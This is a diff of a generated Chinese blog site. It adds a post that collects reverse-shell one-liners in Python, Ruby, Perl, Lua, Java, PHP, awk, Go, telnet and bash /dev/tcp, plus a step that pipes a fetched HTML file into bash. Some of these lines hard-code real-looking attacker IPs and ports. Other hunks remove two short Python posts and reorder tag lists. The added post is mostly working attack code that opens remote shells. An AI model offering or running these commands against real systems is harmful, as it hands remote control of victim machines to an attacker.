+<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import</span><br><span class="line">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.conne</span><br><span class="line">ct((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150737869.png" alt="image-20201228150737869"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150753311.png" alt="image-20201228150753311"></p>
+<h2 id="ruby反弹-错误的文件描述符"><a href="#ruby反弹-错误的文件描述符" class="headerlink" title="ruby反弹(错误的文件描述符)"></a>ruby反弹(错误的文件描述符)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby -r socket -e &#x27;f=TCPSocket.open(&quot;47.92.***.***&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if</span><br><span class="line">fork;c&#x3D;TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)</span><br><span class="line">&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="exec反弹"><a href="#exec反弹" class="headerlink" title="exec反弹"></a>exec反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/47.92.137.130/2333; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228153800396.png" alt="image-20201228153800396"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228153817676.png" alt="image-20201228153817676"></p>
+<h2 id="lua反弹-无法安装luasocket模块"><a href="#lua反弹-无法安装luasocket模块" class="headerlink" title="lua反弹(无法安装luasocket模块)"></a>lua反弹(无法安装luasocket模块)</h2><h3 id="lua安装"><a href="#lua安装" class="headerlink" title="lua安装"></a>lua安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.4.2.tar.gz</span><br><span class="line">tar zxf lua-5.4.2.tar.gz</span><br><span class="line">cd lua-5.4.2</span><br><span class="line">make all test</span><br><span class="line">make linux test </span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228160031878.png" alt="image-20201228160031878"></p>
+<p>说明我们安装的luasocket位置，从错误提示可以看出</p>
+<p>.lua文件它是从/usr/local/share/lua路径中查找</p>
+<p>.so 文件是从/usr/local/lib/lua 路径查找</p>
+<h3 id="安装socket包"><a href="#安装socket包" class="headerlink" title="安装socket包"></a>安装socket包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ip&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use</span><br><span class="line">Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(c</span><br><span class="line">onnect(S,sockaddr_in($p,inet_aton($i))))</span><br><span class="line">&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>不依赖bin/sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new</span><br><span class="line">IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-</span><br><span class="line">&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="java反弹-编译环境缺少"><a href="#java反弹-编译环境缺少" class="headerlink" title="java反弹(编译环境缺少)"></a>java反弹(编译环境缺少)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095332683.png" alt="image-20201229095332683"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095347247.png" alt="image-20201229095347247"></p>
+<p>两个端口，一个输入，一个输出</p>
+<p>监听端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat: nc -nvvp 8000</span><br><span class="line">netcat: nc -nvvp 7000</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 攻击机ip 8000 | /bin/bash | telnet 攻击机ip 7000</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;47.92.137.130&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095856826.png" alt="image-20201229095856826"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095920936.png" alt="image-20201229095920936"></p>
+<h2 id="ssh反弹"><a href="#ssh反弹" class="headerlink" title="ssh反弹"></a>ssh反弹</h2><h2 id="Curl反弹"><a href="#Curl反弹" class="headerlink" title="Curl反弹"></a>Curl反弹</h2><p>开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.2.103&#x2F;bash.html|bash #利用管道符将文件内容作为参数进行传递</span><br><span class="line">#把bash命令写入html文件</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.99.2&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="awk反弹"><a href="#awk反弹" class="headerlink" title="awk反弹"></a>awk反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/IP/PORT&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229101723982.png" alt="image-20201229101723982"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229101737511.png" alt="image-20201229101737511"></p>
+<h2 id="Crontab反弹（计划任务）"><a href="#Crontab反弹（计划任务）" class="headerlink" title="Crontab反弹（计划任务）"></a>Crontab反弹（计划任务）</h2><h2 id="ICMP反弹"><a href="#ICMP反弹" class="headerlink" title="ICMP反弹"></a>ICMP反弹</h2><h2 id="golang反弹"><a href="#golang反弹" class="headerlink" title="golang反弹"></a>golang反弹</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;...&#x27;</span> &gt; /tmp/t.<span class="keyword">go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"><span class="keyword">import</span><span class="string">&quot;os/exec&quot;</span>;</span><br><span class="line"><span class="keyword">import</span><span class="string">&quot;net&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    c,_:=net.Dial(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;192.168.0.1:65535&quot;</span>);</span><br><span class="line">    cmd:=exec.Command(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    cmd.Stdin=c;</span><br><span class="line">    cmd.Stdout=c;</span><br><span class="line">    cmd.Stderr=c;</span><br><span class="line">    cmd.Run()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Cryptcat反弹"><a href="#Cryptcat反弹" class="headerlink" title="Cryptcat反弹"></a>Cryptcat反弹</h2><h2 id="MSF反弹"><a href="#MSF反弹" class="headerlink" title="MSF反弹"></a>MSF反弹</h2><h2 id="Powershell反弹"><a href="#Powershell反弹" class="headerlink" title="Powershell反弹"></a>Powershell反弹</h2><h2 id="利用OpenSSL对数据流加密"><a href="#利用OpenSSL对数据流加密" class="headerlink" title="利用OpenSSL对数据流加密"></a>利用OpenSSL对数据流加密</h2>
       
 
       
@@ -1038,171 +1337,9 @@
 
 
   
-    <article id="post-python-字符串切片、切割" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/31/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%87%E7%89%87%E3%80%81%E5%88%87%E5%89%B2/">python-字符串切片、切割</a>
-    </h1>
-  
-
-        
-        <a href="/2020/10/31/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%87%E7%89%87%E3%80%81%E5%88%87%E5%89%B2/" class="archive-article-date">
-  	<time datetime="2020-10-31T02:17:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>写IP地址类型转换,将多种IP段表达类型转换为地址列表</p>
-<p>因为192.168.160.1-222这种,要进行分割</p>
-<p>使用split方法进行分割</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="string">&quot;192.168.1.1-245&quot;</span></span><br><span class="line">ip = str.split(<span class="string">&#x27;.&#x27;</span>)    <span class="comment"># 以点为标记分割str字符串，并保存到列表</span></span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/31/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%87%E7%89%87%E3%80%81%E5%88%87%E5%89%B2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python-IPy包" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/30/Python-IPy%E5%8C%85/">Python-IPy包</a>
-    </h1>
-  
-
-        
-        <a href="/2020/10/30/Python-IPy%E5%8C%85/" class="archive-article-date">
-  	<time datetime="2020-10-30T13:30:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pip</span> install IPy</span><br></pre></td></tr></table></figure>
-
-<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>class and tools for handling of IPv4 and IPv6 addresses and networks.</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">编程</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/30/Python-IPy%E5%8C%85/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 
@@ -1301,26 +1438,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Robocopy</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件管理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">excel</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">学习</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">注册表</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">工作</a>
               </li>
              
@@ -1333,7 +1450,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Robocopy</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件管理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">GIT</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">注册表</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">excel</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1393,15 +1530,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">阿里云</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">JS</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">浏览器，开发</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">阿里云</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1414,6 +1551,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">端口转发</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">HTML</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
              
               <li class="article-tag-list-item">
